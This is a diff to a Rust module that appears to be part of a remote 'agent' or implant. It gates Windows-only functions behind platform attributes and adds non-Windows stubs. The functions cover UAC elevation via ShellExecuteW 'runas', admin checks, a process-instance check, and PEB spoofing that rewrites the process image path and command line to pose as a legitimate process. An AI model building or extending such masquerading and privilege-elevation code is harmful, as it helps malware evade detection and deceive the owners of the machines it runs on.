@@ -2,8 +2,9 @@
 
 use std::ptr;
 
-// ── Public API ───────────────────────────────────────────────────────
+// ── Public API (Windows implementation) ───────────────────────────────
 
+#[cfg(target_os = "windows")]
 /// Attempt to elevate via standard UAC prompt (ShellExecuteW runas).
 /// Returns Ok(true) if a new elevated process was spawned (caller should exit).
 /// Returns Ok(false) if already admin. Returns Err if user declined UAC.
@@ -21,6 +22,7 @@ pub fn try_elevate(exe_path: &str) -> Result<bool, ()> {
 
 // ── ShellExecuteW runas (UAC prompt) ────────────────────────────────
 
+#[cfg(target_os = "windows")]
 fn runas_elevate(exe_path: &str) -> bool {
     unsafe {
         let exe_wide = to_wide(exe_path);
@@ -40,6 +42,7 @@ fn runas_elevate(exe_path: &str) -> bool {
 
 // ── Admin Check ─────────────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 pub fn is_admin() -> bool {
     use std::os::windows::process::CommandExt;
     std::process::Command::new("net")
@@ -53,6 +56,7 @@ pub fn is_admin() -> bool {
 }
 
 /// Check if another instance of our exe is running (different PID than us).
+#[cfg(target_os = "windows")]
 pub fn check_elevated_instance_running(exe_path: &str) -> bool {
     let our_pid = std::process::id();
     let our_name = std::path::Path::new(exe_path)
@@ -98,6 +102,7 @@ pub fn check_elevated_instance_running(exe_path: &str) -> bool {
 // ── PEB Spoofing ────────────────────────────────────────────────────
 
 /// Spoof the PEB ImagePathName and CommandLine to appear as a legitimate process.
+#[cfg(target_os = "windows")]
 pub fn spoof_peb(fake_name: &str) {
     #[cfg(target_os = "windows")]
     unsafe {
@@ -176,17 +181,23 @@ unsafe fn is_bad_write_ptr(ptr: *mut u8, size: usize) -> bool {
 
 // ── Helpers ─────────────────────────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 fn to_wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
 }
 
 // ── Windows Types & Constants ───────────────────────────────────────
 
+#[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
+#[cfg(target_os = "windows")]
 const SW_SHOWNORMAL: i32 = 1;
+#[cfg(target_os = "windows")]
 const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+#[cfg(target_os = "windows")]
 const INVALID_HANDLE_VALUE: *mut std::ffi::c_void = -1isize as *mut std::ffi::c_void;
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct UnicodeString {
     Length: u16,
@@ -194,6 +205,7 @@ struct UnicodeString {
     Buffer: *mut u16,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C)]
 struct PROCESSENTRY32 {
     dwSize: u32,
@@ -222,6 +234,7 @@ struct MEMORY_BASIC_INFORMATION {
     _pad1: u32,
 }
 
+#[cfg(target_os = "windows")]
 #[link(name = "shell32")]
 extern "system" {
     fn ShellExecuteW(
@@ -237,4 +250,28 @@ extern "system" {
     fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> *mut std::ffi::c_void;
     fn Process32First(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
     fn Process32Next(hSnapshot: *mut std::ffi::c_void, lppe: *mut PROCESSENTRY32) -> i32;
+}
+
+// ── Public API (non-Windows stubs) ──────────────────────────────────
+
+#[cfg(not(target_os = "windows"))]
+pub fn try_elevate(_exe_path: &str) -> Result<bool, ()> {
+    // No UAC on non-Windows; treat as "already running elevated".
+    Ok(false)
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn is_admin() -> bool {
+    // Unix agents run with whatever privileges the parent shell has.
+    unsafe { libc::geteuid() == 0 }
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn check_elevated_instance_running(_exe_path: &str) -> bool {
+    false
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn spoof_peb(_fake_name: &str) {
+    // PEB spoofing is Windows-only; no-op elsewhere.
 }
